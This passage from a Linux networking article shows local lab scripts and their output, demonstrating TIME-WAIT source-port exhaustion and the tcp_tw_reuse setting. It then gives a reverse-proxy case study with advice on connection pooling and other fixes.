attempts = int(sys.argv[1]); pause = float(sys.argv[2]) if len(sys.argv) > 2 else 0
srv = socket.socket(); srv.bind(("127.0.0.1", 8080)); srv.listen(64)
for i in range(1, attempts + 1):
    try:
        c = socket.create_connection(("127.0.0.1", 8080))
    except OSError as e:
        print(f"connect {i}: {errno.errorcode[e.errno]} ({e.strerror})")
        continue
    port = c.getsockname()[1]
    s, _ = srv.accept(); c.close(); s.recv(1); s.close()
    print(f"connect {i}: ok, source port {port}")
    time.sleep(pause)
pool.py sends 1000 small requests, either with a new connection each or over one kept-open connection:
"""The same 1000 requests, once with a new connection each, once over one kept connection."""
import socket, subprocess, sys

def tw():
    out = subprocess.run(["ss", "-tanH", "state", "time-wait", f"( dport = :{port} )"], capture_output=True, text=True).stdout
    return len(out.splitlines())

mode, port = sys.argv[1], int(sys.argv[2])
srv = socket.socket(); srv.bind(("127.0.0.1", port)); srv.listen(64)
if mode == "new-per-request":
    for _ in range(1000):
        c = socket.create_connection(("127.0.0.1", port)); s, _ = srv.accept()
        c.sendall(b"GET\n"); s.recv(4); s.sendall(b"OK\n"); c.recv(3)
        c.close(); s.recv(1); s.close()
else:  # pooled
    c = socket.create_connection(("127.0.0.1", port)); s, _ = srv.accept()
    for _ in range(1000):
        c.sendall(b"GET\n"); s.recv(4); s.sendall(b"OK\n"); c.recv(3)
    c.close(); s.recv(1); s.close()
print(f"{mode:16} 1000 requests -> {tw()} sockets in TIME-WAIT")
#!/bin/sh
# Run as: unshare -rn sh lab2.sh
ip link set lo up
P=/proc/sys/net/ipv4
echo 40000 40003 > $P/ip_local_port_range      # four source ports, to make exhaustion quick
echo "== 6. tcp_tw_reuse=0: four ports, six connections"
echo 0 > $P/tcp_tw_reuse
python3 exhaust.py 6
sleep 75
echo "== 7. tcp_tw_reuse=2 (loopback): same six, 1.1 s apart"
echo 2 > $P/tcp_tw_reuse
python3 exhaust.py 6 1.1
echo "== 8. one connection per request vs one pooled connection"
echo "32768 60999" > $P/ip_local_port_range
python3 pool.py new-per-request 9001
python3 pool.py pooled 9002
$ unshare -rn sh lab2.sh
== 6. tcp_tw_reuse=0: four ports, six connections
connect 1: ok, source port 40002
connect 2: ok, source port 40000
connect 3: ok, source port 40001
connect 4: ok, source port 40003
connect 5: EADDRNOTAVAIL (Cannot assign requested address)
connect 6: EADDRNOTAVAIL (Cannot assign requested address)
== 7. tcp_tw_reuse=2 (loopback): same six, 1.1 s apart
connect 1: ok, source port 40000
connect 2: ok, source port 40002
connect 3: ok, source port 40002
connect 4: ok, source port 40002
connect 5: ok, source port 40002
connect 6: ok, source port 40000
== 8. one connection per request vs one pooled connection
new-per-request  1000 requests -> 1000 sockets in TIME-WAIT
pooled           1000 requests -> 1 sockets in TIME-WAIT

Step 6. With reuse off, four connections fit and the fifth connect() fails with EADDRNOTAVAIL. That error, not “too many open files”, is what port exhaustion looks like to the application.
Step 7. With tcp_tw_reuse=2 and loopback, all six work: the kernel takes over a TIME-WAIT port (40002 is used four times). It does this only because Linux sends TCP timestamps by default, which lets PAWS (RFC 7323) reject old duplicates. The source (tcp_twsk_unique() in net/ipv4/tcp_ipv4.c) also requires the last timestamp to be from an earlier second; that is why the script pauses 1.1 s.
Step 8. The real fix. The same 1000 requests leave 1000 TIME-WAIT sockets, or 1 when they share a connection.

The default 2 explains a common surprise: reuse “works” in a laptop benchmark against localhost and does nothing against a remote backend. For non-loopback traffic you have to set 1 yourself.

title: TIME-WAIT on Linux: What the Timers Really Do
section: Case: the proxy that ran out of ports
text:
Case: the proxy that ran out of ports
A reverse proxy forwards to a single backend 10.0.0.5:8080 and opens a new upstream connection per request, closing it after the response. At 600 requests/s it holds about 600 × 60 = 36,000 TIME-WAIT sockets toward one destination. That is more than the 28,232 ports in the default range, so upstream connect() calls begin to fail with EADDRNOTAVAIL.
The fixes, in order:

Keep upstream connections alive and pool them. For nginx, use keepalive in the upstream block with proxy_http_version 1.1 and an empty Connection header. For an HTTP client library, reuse the client object. This removes the problem instead of hiding it.
Let the side that can afford it close. If the backend closes, its TIME-WAIT is keyed on its listening port with many client ports, which never exhausts anything.
Spread the four-tuple. More backend IPs or ports, or more proxy source IPs (proxy_bind), each give a fresh 28k ports.
Then, maybe, tcp_tw_reuse=1 on the client host, knowing it relies on timestamps on both ends.
Widen ip_local_port_range if you must, but avoid ports that local services listen on.

Never: lower tcp_max_tw_buckets, set the removed tcp_tw_recycle, or “fix” it with SO_LINGER timeout 0. That last one sends RST instead of FIN and throws away unsent data.

title: TIME-WAIT on Linux: What the Timers Really Do
text:
Trap
Counting TIME-WAIT sockets and panicking. Thousands of them on a busy web server are normal and cheap. Measure the symptom instead: EADDRNOTAVAIL in client logs, or TIME-WAIT grouped by destination nearing your port range:
ss -tanH state time-wait | awk '{print $4}' | sort | uniq -c | sort -rn | head

title: TIME-WAIT on Linux: What the Timers Really Do
text:
Boring rule
Leave the TIME-WAIT sysctls alone. Pool connections to the same destination, and only if a measured shortage remains, turn on tcp_tw_reuse=1 on the side that connects.
